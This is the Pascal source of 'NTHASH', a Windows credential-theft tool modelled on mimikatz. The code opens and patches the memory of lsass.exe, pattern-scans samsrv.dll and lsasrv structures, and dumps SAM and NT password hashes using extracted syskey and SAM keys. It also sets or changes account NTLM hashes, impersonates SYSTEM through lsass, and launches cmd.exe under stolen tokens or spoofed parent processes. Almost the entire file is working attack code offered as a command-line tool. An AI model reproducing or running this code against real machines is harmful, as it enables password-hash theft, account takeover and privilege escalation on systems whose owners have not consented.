{$mode delphi}{$H+}

program NTHASH;

uses windows, classes, sysutils, dos, usamlib, usid, upsapi, uimagehlp,
  uadvapi32, utils, untdll, umemory, ucryptoapi, usamutils, uofflinereg;





type i_logsesslist=record
     next:nativeuint;
     prev:nativeuint;
     usagecount:nativeuint;
     this:nativeuint;
     luid:nativeuint;
     unk1:nativeuint;
     unk2:nativeuint;
     usernameptr:nativeuint;
     minmax:nativeuint;
     domainptr:nativeuint;
     passwordptr:nativeuint; //??
     end;



const
WIN_X64_Int_User_Info:array[0..3] of byte=($49, $8d, $41, $20);
WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);

var
  lsass_pid:dword=0;
  p:dword;
  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
  oldhashbyte,newhashbyte:tbyte16;
  myPsid:PSID;
  mystringsid:pchar;
  winver,osarch:string;
  sysdir:pchar;
  syskey,samkey,nthash:tbyte16;

//********************************************************************************
function callback_QueryUsers(param:pointer=nil):dword;stdcall;
var
  status:ntstatus;
  userhandle_:thandle=thandle(-1);
  userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
  lm,ntlm:string;
begin
result:=0;
if param<>nil then
     begin
     //log(pdomainuser (param).rid) ;
     //
     Status := SamOpenUser(pdomainuser (param).domain_handle  , MAXIMUM_ALLOWED , pdomainuser (param).rid  , @UserHandle_);
     if Status <> 0 then
     begin log('SamOpenUser failed:'+inttohex(status,8),status);;end
     else log('SamOpenUser ok',status);
     //
     status:=SamQueryInformationUser(UserHandle_ ,$12,userinfo);
     if Status <> 0 then
     begin log('SamQueryInformationUser failed:'+inttohex(status,8),status);;end
     else log ('SamQueryInformationUser ok',status);
     if status=0 then
     begin
     if (userinfo^.LmPasswordPresent=1 ) then lm:=HashByteToString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
     if (userinfo^.NtPasswordPresent=1) then ntlm:=HashByteToString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
     log(pdomainuser (param).username +':'+inttostr(pdomainuser (param).rid) +':'+lm+':'+ntlm,1);
     result:=1;
     SamFreeMemory(userinfo);
     end;
     //
     end;
end;


//**********************************************************************
{
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
//pattern should be a parameter to make this function generic...
function search(hprocess:thandle;addr:pointer;sizeofimage:DWORD):nativeint;
const
  //search pattern
  WIN_X64:array[0..3] of byte=($49, $8d, $41, $20);
  WIN_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);

var
  i:nativeint;
  buffer,pattern:tbytes;
  read:cardinal;
begin
result:=0;
if LowerCase (osarch )='amd64' then
   begin
   setlength(buffer,4);
   setlength(pattern,4);
   CopyMemory (@pattern[0],@WIN_X64[0],length(pattern));
   end
   else
   begin
   setlength(buffer,5);
   setlength(pattern,5);
   CopyMemory (@pattern[0],@WIN_X86[0],length(pattern));
   end;
log('Searching...',0);
  for i:=nativeint(addr) to nativeint(addr)+sizeofimage-length(buffer) do
      begin
      //fillchar(buffer,4,0);
      if ReadProcessMemory( hprocess,pointer(i),@buffer[0],length(buffer),@read) then
        begin
        //log(inttohex(i,sizeof(pointer)));
        if CompareMem (@pattern [0],@buffer[0],length(buffer)) then
           begin
           result:=i;
           break;
           end;
        end;//if readprocessmemory...
      end;//for
log('Done!',0);
end;
}

function Init_Int_User_Info:tbytes;
var
  pattern:array of byte;
begin

  if LowerCase (osarch )='amd64' then
     begin
     setlength(pattern,length(WIN_X64_Int_User_Info));
     CopyMemory (@pattern[0],@WIN_X64_Int_User_Info[0],length(WIN_X64_Int_User_Info));
     end
     else
     begin
     setlength(pattern,length(WIN_X86_Int_User_Info));
     CopyMemory (@pattern[0],@WIN_X86_Int_User_Info[0],length(WIN_X86_Int_User_Info));
     end;
result:=pattern;
end;

//https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
function dumpsam(pid:dword;user:string):boolean;
const
//offset x64
WIN_BUILD_2K3:ShortInt=	-17; //need a nop nop
WIN_BUILD_VISTA:ShortInt=	-21;
WIN_BUILD_BLUE:ShortInt=	-24;
WIN_BUILD_10_1507:ShortInt=	-21;
WIN_BUILD_10_1703:ShortInt=	-19;
WIN_BUILD_10_1709:ShortInt=	-21;
WIN_BUILD_10_1803:ShortInt=	-21; //verified
WIN_BUILD_10_1809:ShortInt=	-24;
//offset x86
WIN_BUILD_XP_86:ShortInt=-8;
WIN_BUILD_7_86:ShortInt=-8; //verified
WIN_BUILD_8_86:ShortInt=-12;
WIN_BUILD_BLUE_86:ShortInt=-8;
WIN_BUILD_10_1507_86:ShortInt=-8;
WIN_BUILD_10_1607_86:ShortInt=-12;
const
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  backup:array[0..1] of byte;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  result:=false;
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA;
     if copy(winver,1,3)='6.3' then patch_pos :=WIN_BUILD_BLUE; //win 8.1
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507;
     if (pos('-1703',winver)>0) then patch_pos :=WIN_BUILD_10_1703;
     if (pos('-1709',winver)>0) then patch_pos :=WIN_BUILD_10_1709;
     if (pos('-1803',winver)>0) then patch_pos :=WIN_BUILD_10_1803;
     if (pos('-1809',winver)>0) then patch_pos :=WIN_BUILD_10_1809;
     end;
  if (lowercase(osarch)='x86') then
     begin
     if copy(winver,1,3)='5.1' then patch_pos :=WIN_BUILD_XP_86;
     //vista - 6.0?
     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_7_86;
     //win 8.0 ?
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507_86;
     if (pos('-1607',winver)>0) then patch_pos :=WIN_BUILD_10_1607_86;
     end;
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=lowercase(strpas(szModName ));
                      //writeln(dummy); //debug
                      if pos('samsrv.dll',dummy)>0 then
                         begin
                         log('samsrv.dll found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            pattern:=Init_Int_User_Info ;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                 if ReadMem  (hprocess,offset+patch_pos,backup) then
                                   begin
                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2)+leftpad(inttohex(backup[1],1),2),0);
                                   if WriteMem(hprocess,offset+patch_pos,after)=true then
                                        begin
                                        log('patch ok',0);
                                        try
                                        log('***************************************',0);
                                        if QueryUsers ('','',@callback_QueryUsers )=true
                                        //if QueryInfoUser (user)=true
                                           then begin log('SamQueryInformationUser OK',0);result:=true;end
                                           else log('SamQueryInformationUser NOT OK',1);
                                        log('***************************************',0);
                                        finally //we really do want to patch back
                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch failed');
                                        //should we read and compare before/after?
                                        end;
                                        end
                                        else log('patch failed',1);
                                   end;
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         break; //no need to search other modules...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;


//check kuhl_m_sekurlsa_utils.c
function dumplogons(pid:dword;module:string):boolean;
const
  WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
  WNBLUE_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
  // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
  PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
  PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:array of byte;
  logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
     copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
     patch_pos:=23;
     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
     patch_pos:=36;
     //{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
     //{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
     //{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
     patch_pos:=-4;
     end;
  //x86 to do...
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=lowercase(strpas(szModName ));
                      if pos(lowercase(module),dummy)>0 then
                         begin
                         log(module+' found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //
                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
                                   begin
                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword+4,4));
                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                                   log(inttohex(offset+offset_list_dword+4+patch_pos,sizeof(pointer)),0);
                                   //read sesslist at position
                                   ReadMem  (hprocess,offset+offset_list_dword+4+patch_pos,logsesslist );
                                   log(inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer)),0) ;
                                   end; //if readmem
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;

function impersonatepid(pid:dword):boolean;
var
  i:byte;
begin
result:=false;
for i:=3 downto 0 do
  begin
  if ImpersonateAsSystemW_Vista (TIntegrityLevel(i),pid) then begin result:=true;exit;end;
  end;
log('impersonatepid NOT OK',1);
end;

function createprocessaspid(ApplicationName: string;pid:string     ):boolean;
var
  StartupInfo: TStartupInfoW;
  ProcessInformation: TProcessInformation;
  i:byte;
begin
ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
  FillChar(StartupInfo, SizeOf(TStartupInfoW), 0);
  StartupInfo.cb := SizeOf(TStartupInfoW);
  StartupInfo.lpDesktop := 'WinSta0\Default';
  for i:=3 downto 0 do
    begin
    result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),NORMAL_PRIORITY_CLASS,
    nil,pwidechar(widestring(GetCurrentDir)),
    StartupInfo,ProcessInformation,
    TIntegrityLevel(i),
    strtoint(pid ));
    if result then break;
    end;
end;

function callback_SamUsers(param:pointer=nil):dword;stdcall;
var
  bytes:tbyte16;
  username:string;
begin
  if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
     then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1)
     else log('gethash NOT OK for '+username ,1);
end;



begin
  log('NTHASH 1.2 by erwan2212@gmail.com',1);
  winver:=GetWindowsVer;
  osarch:=getenv('PROCESSOR_ARCHITECTURE');
  log('Windows Version:'+winver,1);
  log('Architecture:'+osarch,1);
  log('Username:'+GetCurrUserName,1);
  log('DebugPrivilege:'+BoolToStr (EnableDebugPriv),1);
  lsass_pid:=_EnumProc('lsass.exe');
  log('LSASS PID:'+inttostr(lsass_pid ),1);
  getmem(sysdir,Max_Path );
  GetSystemDirectory(sysdir, MAX_PATH - 1);
  //
  if paramcount=0 then
  begin
  log('NTHASH /setntlm [/server:hostname] /user:username /newhash:xxx',1);
  log('NTHASH /setntlm [/server:hostname] /user:username /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
  log('NTHASH /gethash /password:password',1);
  log('NTHASH /getsid /user:username [/server:hostname]',1);
  log('NTHASH /getusers [/server:hostname]',1);
  log('NTHASH /getdomains [/server:hostname]',1);
  log('NTHASH /dumpsam',1);
  log('NTHASH /dumphashes [/offline]',1);
  log('NTHASH /dumphash /rid:500 [/offline]',1);
  log('NTHASH /getsyskey [/offline]',1);
  log('NTHASH /getsamkey [/offline]',1);
  log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /enumpriv',1);
  log('NTHASH /enumproc',1);
  log('NTHASH /killproc /pid:12345',1);
  log('NTHASH /enummod /pid:12345',1);
  log('NTHASH /dumpprocess /pid:12345',1);
  log('NTHASH /a_command /verbose',1);
  log('NTHASH /a_command /system',1);
  end;
  //
  p:=pos('/system',cmdline);
  if p>0 then
     begin
     if impersonatepid (lsass_pid) then log('Impersonate:'+GetCurrUserName,1);
     end;
  p:=pos('/verbose',cmdline);
  if p>0 then verbose:=true;
  p:=pos('/offline',cmdline);
  if p>0 then
     begin
     usamutils.offline :=true;
     log('Offline=true',1);
     if (not FileExists ('sam.sav')) or (not FileExists ('system.sav')) then
        begin
        log('sam.sav and/or system.sav missing',1);
        exit;
        end;
     end;
  //
  //logon list located in memory
  //now need to get lsakeys to decrypt crdentials
  //dumplogons (lsass_pid,'');
  //_FindPid ;
  //enum_samusers(samkey);
  //exit;
  //
  p:=pos('/dumplogons',cmdline);
  if p>0 then
     begin
     dumplogons (lsass_pid,'wdigest.dll');
     exit;
     end;
  p:=pos('/enumpriv',cmdline);
  if p>0 then
     begin
     if enumprivileges=false then writeln('enumprivileges NOT OK');
     exit;
     end;
  p:=pos('/pid:',cmdline);
  if p>0 then
       begin
       pid:=copy(cmdline,p,255);
       pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(pid,pos(' ',pid),255);
       end;
  p:=pos('/rid:',cmdline);
  if p>0 then
       begin
       rid:=copy(cmdline,p,255);
       rid:=stringreplace(rid,'/rid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(rid,pos(' ',rid),255);
       end;
  p:=pos('/binary:',cmdline);
  if p>0 then
       begin
       binary:=copy(cmdline,p,255);
       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
       delete(binary,pos(' ',binary),255);
       end;
  p:=pos('/getsyskey',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey)
        then log('Syskey:'+HashByteToString(syskey) ,1)
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/getsamkey',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+HashByteToString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then log('SAMKey:'+HashByteToString(samkey) ,1)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/dumphashes',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+HashByteToString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then
              begin
              log('SAMKey:'+HashByteToString(samkey) ,1);
              query_samusers (samkey,@callback_SamUsers );
              end //if getsamkey(syskey,samkey)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/dumphash',cmdline);
  if p>0 then
     begin
     if rid='' then exit;
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+HashByteToString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then
              begin
              log('SAMKey:'+HashByteToString(samkey) ,1);
              if dumphash(samkey,strtoint(rid),nthash,user)
                 then log('NTHASH:'+user+':'+rid+'::'+HashByteToString(nthash) ,1)
                 else log('gethash NOT OK' ,1);
              end //if getsamkey(syskey,samkey)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/enumproc',cmdline);
    if p>0 then
       begin
       _EnumProc ;
       exit;
       end;
    p:=pos('/enummod',cmdline);
    if p>0 then
       begin
       if pid='' then exit;
       _EnumMod(strtoint(pid),'');
       exit;
       end;
  p:=pos('/dumpprocess',cmdline);
  if p>0 then
     begin
     if pid='' then exit;
     if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/killproc',cmdline);
  if p>0 then
     begin
     if pid='' then exit;
     if _killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/dumpsam',cmdline);
  if p>0 then
     begin
     if dumpsam (lsass_pid ,'') then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/server:',cmdline);
  if p>0 then
       begin
       server:=copy(cmdline,p,255);
       server:=stringreplace(server,'/server:','',[rfReplaceAll, rfIgnoreCase]);
       delete(server,pos(' ',server),255);
       //log(server);
       end;
  p:=pos('/user:',cmdline);
    if p>0 then
         begin
         user:=copy(cmdline,p,255);
         user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
         delete(user,pos(' ',user),255);
         //log(user);
         end;
    p:=pos('/password:',cmdline);
      if p>0 then
           begin
           password:=copy(cmdline,p,255);
           password:=stringreplace(password,'/password:','',[rfReplaceAll, rfIgnoreCase]);
           delete(user,pos(' ',password),255);
           //log(user);
           end;
    p:=pos('/gethash',cmdline);
      if p>0 then
           begin
           if password='' then exit;
           log (GenerateNTLMHash (password),1);
           exit;
           end;
  p:=pos('/getusers',cmdline);
  if p>0 then
       begin
       QueryUsers (pchar(server),'',nil );
       exit;
       end;
  p:=pos('/getdomains',cmdline);
  if p>0 then
       begin
       QueryDomains (pchar(server),nil );
       exit;
       end;
  p:=pos('/getsid',cmdline);
  if p>0 then
       begin
       GetAccountSid2(widestring(server),widestring(user),mypsid);
       ConvertSidToStringSidA (mypsid,mystringsid);
       log(mystringsid,1);
       exit;
       end;
  p:=pos('/oldhash:',cmdline);
  if p>0 then
       begin
       oldhash:=copy(cmdline,p,255);
       oldhash:=stringreplace(oldhash,'/oldhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldhash,pos(' ',oldhash),255);
       //log(oldhash);
       end;
  p:=pos('/newhash:',cmdline);
  if p>0 then
       begin
       newhash:=copy(cmdline,p,255);
       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newhash,pos(' ',newhash),255);
       //log(newhash);
       end;
  p:=pos('/oldpwd:',cmdline);
  if p>0 then
       begin
       oldpwd:=copy(cmdline,p,255);
       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldpwd,pos(' ',oldpwd),255);
       //log(oldpwd);
       end;
  p:=pos('/newpwd:',cmdline);
  if p>0 then
       begin
       newpwd:=copy(cmdline,p,255);
       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newpwd,pos(' ',newpwd),255);
       //log(newpwd);
       end;
  p:=pos('/setntlm',cmdline);
  if p>0 then
       begin
       if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
       if newpwd<>'' then newhash:=GenerateNTLMHash (newpwd);
       if SetInfoUser (server,user, HashStringToByte (newhash))
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/changentlm',cmdline);
  if p>0 then
       begin
       if oldpwd<>'' then oldhashbyte:=tbyte16(GenerateNTLMHashByte (oldpwd));
       if newpwd<>'' then newhashbyte:=tbyte16(GenerateNTLMHashByte (newpwd));
       if oldhash<>'' then oldhashbyte :=HashStringToByte (oldhash);
       if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
       if ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/runastoken',cmdline);
  if p>0 then
     begin
     if copy(winver,1,3)='5.1' then exit;
     if pid='' then exit;
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if createprocessaspid   (binary,pid)
        then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/runasuser',cmdline);
  if p>0 then
     begin
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if CreateProcessAsLogon (user,password,binary,'')=0
        then log('Done',1)
        else log('Failed',1);
     //WriteLn(Impersonate('l4mpje','Password123')) ;
     //writeln(GetLastError );
     //WriteLn (GetCurrUserName);
     //RevertToSelf ;
     //writeln(GetCurrUserName );
     end;
  p:=pos('/runaschild',cmdline);
  if p>0 then
     begin
     if copy(winver,1,3)='5.1' then exit;
     if pid='' then exit;
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if CreateProcessOnParentProcess(strtoint(pid),binary)=true
        then log('OK',1) else log('NOT OK',1);
     exit;
     end;


end.

